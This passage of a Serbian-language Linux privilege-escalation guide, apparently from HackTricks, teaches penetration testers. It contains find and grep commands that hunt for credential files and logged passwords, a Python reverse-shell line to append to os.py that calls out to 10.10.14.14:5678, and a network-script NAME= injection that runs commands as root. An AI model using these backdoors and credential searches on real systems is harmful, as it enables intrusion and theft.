### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binarne datoteke u PATH-u**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pregledajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih datoteka koje bi mogle sadržati lozinke**.\
**Još jedan zanimljiv alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koja je aplikacija otvorenog koda koja služi za pribavljanje velikog broja lozinki pohranjenih na lokalnom računaru za Windows, Linux & Mac.

### Logovi

Ako možete čitati logove, možda ćete u njima naći **interesantne/poverljive informacije**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki "**loše**" konfigurisani (backdoored?) **audit logs** mogu vam omogućiti da **zabeležite lozinke** unutar audit logova, kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste mogli da **čitati logove**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) biće vam od velike pomoći.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe bi trebalo proveriti fajlove koji sadrže reč "**password**" u svom **imenu** ili u **sadržaju**, kao i proveriti IPs i emails unutar logova, ili hashes regexps.\
Neću ovde navoditi kako se sve ovo radi, ali ako te zanima možeš pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Fajlovi sa pravima za pisanje

### Python library hijacking

Ako znaš **odakle** će se python skripta izvršavati i **možeš pisati** u taj folder ili **možeš modifikovati python libraries**, možeš modifikovati OS library i backdoor it (ako možeš pisati tamo gde će se python skripta izvršavati, kopiraj i nalepi os.py library).

Da **backdoor the library**, jednostavno dodaj na kraj os.py library sledeću liniju (promeni IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacija

Ranljivost u `logrotate` dozvoljava korisnicima sa **write permissions** na log fajlu ili njegovim roditeljskim direktorijumima da potencijalno dobiju eskalirane privilegije. To je zato što se `logrotate`, često pokrenut kao **root**, može manipulisati da izvrši proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti permisije ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje log rotation.

> [!TIP]
> Ova ranljivost utiče na `logrotate` verziju `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na sledećoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranljivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god otkrijete da možete menjati logs, proverite ko upravlja tim logs i proverite da li možete eskalirati privilegije zamenom tih logs symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **write** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **or** može da **adjust** postojeću, onda je vaš **system is pwned**.

Network scripts, _ifcg-eth0_ na primer, koriste se za network connections. Izgledaju tačno kao .INI fajlovi. Međutim, oni su ~sourced~ na Linuxu od strane Network Manager (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network skriptama nije pravilno obrađen. Ako imate **razmak u imenu, sistem pokušava da izvrši deo nakon razmaka**. To znači da **sve posle prvog razmaka se izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Obratite pažnju na prazno mesto između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servisa. One se mogu izvršavati direktno ili preko simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

Sa druge strane, `/etc/init` je vezan za **Upstart**, noviji **sistem za upravljanje servisima** koji je uveo Ubuntu, i koristi konfiguracione fajlove za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstart-u.

**systemd** predstavlja moderan init i menadžer servisa, koji nudi napredne funkcionalnosti kao što su pokretanje daemon-a na zahtev, upravljanje automount-ovima i snapshot-ovanje stanja sistema. Organizira fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, pojednostavljujući administraciju sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hook-uju syscall da bi izložili privilegovanu kernel funkcionalnost userspace manager-u. Slaba autentifikacija manager-a (npr. signature checks zasnovane na FD-order ili loši password scheme-i) može omogućiti lokalnoj aplikaciji da impersonira manager-a i eskalira privilegije do root na uređajima koji su već root-ovani. Saznajte više i pronađite detalje o exploitovanju ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Otkrivanje servisa vođeno regex-om u VMware Tools/Aria Operations može izvući putanju do binarnog fajla iz command line-a procesa i izvršiti ga sa -v u privilegovanom kontekstu. Permisivni paterni (npr. korišćenje \S) mogu pogoditi attacker-staged listenere u zapisivim lokacijama (npr. /tmp/httpd), što može dovesti do izvršavanja kao root (CWE-426 Untrusted Search Path).

Saznajte više i pogledajte generalizovani obrazac koji se može primeniti na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Zaštite kernela

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vektora:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriše kernel ranjivosti na Linux i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
